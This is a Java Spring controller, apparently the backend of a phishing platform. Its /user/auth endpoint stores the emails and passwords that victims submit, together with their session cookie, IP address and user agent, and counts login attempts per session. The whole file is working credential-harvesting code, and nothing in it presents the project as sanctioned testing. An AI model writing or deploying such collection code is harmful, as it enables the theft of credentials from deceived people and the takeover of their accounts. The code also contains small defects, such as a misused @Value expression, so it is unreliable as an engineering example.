package net.v4lproik.phishingplatform.mvc.controllers;

import net.v4lproik.phishingplatform.mvc.models.Status;
import net.v4lproik.phishingplatform.mvc.models.UserModel;
import net.v4lproik.phishingplatform.service.api.PhishingService;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.util.WebUtils;

import javax.servlet.http.HttpServletRequest;


/**
 * The UserController provides different features that are implemented in REST
 * It basically allows a third party to store data in a database
 */
@Controller
@RequestMapping(value = "/user")
public class UserController {

    static Logger log = Logger.getLogger(UserController.class.getName());

    @Value("Integer.parseInt(${phishingplatform.auth.retry})")
    private String RETRY;

    @Value("${phishingplatform.auth.cookie_name}")
    private String COOKIE_NAME;

    @Autowired
    private PhishingService phishingService;

    @Autowired
    private HttpServletRequest request;

    /**
     * This function provides storage of user information such as ip, cookie, email, password and so on
     *
     * @param cmd Json Data has to be passed to the controller [ "name":"example@xyz.com", "password":"blahblah" ]
     * @return the user that has been created in the database and how many times a user tries to submit
     * the login form per session
     */
    @RequestMapping(value = "/auth", method = RequestMethod.POST)
    @ResponseStatus(value = HttpStatus.OK)
    @ResponseBody
    public Status auth(@RequestBody UserModel cmd) {
        try {
            cmd = this.fillUserInformation(cmd);
            final UserModel created = phishingService.create(cmd);

            int retry;
            if(cmd.getCookie() != null) {
                retry = phishingService.tryToAuthPerSession("cookie", (Object) cmd.getCookie());
                return new Status(0, "[" + cmd.toString() + "], [{\"try\":\"" + retry + "\"}]");
            }else
                return new Status(0, "[" + cmd.toString() + "], [{\"try\":\"Error analyzing cookie.\"}]");

        } catch (Exception e) {
            //e.printStackTrace();
            return new Status(0, "Auth exception " + e.toString());
        }
    }

    /**
     * This function fills the different information related to a user such as email, cookie, user agent ...
     *
     * @param user Instance of User Model
     * @return Instance of User Model
     */
    private UserModel fillUserInformation(UserModel user) {
        try {
            String cookie = WebUtils.getCookie(request, COOKIE_NAME).getValue();
            user.setCookie(cookie);
        }catch(Exception e) {
            log.info("Cookie trying to be read");
            user.setCookie(null);
        }
        user.setFromIp(request.getRemoteAddr());
        user.setUserAgent(request.getHeader("user-agent"));
        return user;
    }
}
